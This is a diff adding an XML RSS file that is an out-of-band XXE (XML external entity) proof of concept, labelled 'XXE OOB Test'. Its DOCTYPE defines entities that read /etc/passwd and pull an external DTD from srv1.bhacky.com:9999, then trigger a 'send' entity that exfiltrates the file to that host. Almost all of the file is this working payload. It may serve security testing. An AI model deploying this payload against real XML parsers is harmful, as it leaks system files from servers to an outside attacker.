@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://srv1.bhacky.com:9999/evil.dtd">
+  %dtd;
+  %send;
+]>
+<rss version="2.0">
+  <channel>
+    <title>XXE OOB Test</title>
+    <link>http://srv1.bhacky.com:9999/poc_xxe_oob.xml</link>
+    <description>OOB XXE attempt</description>
+  </channel>
+</rss>
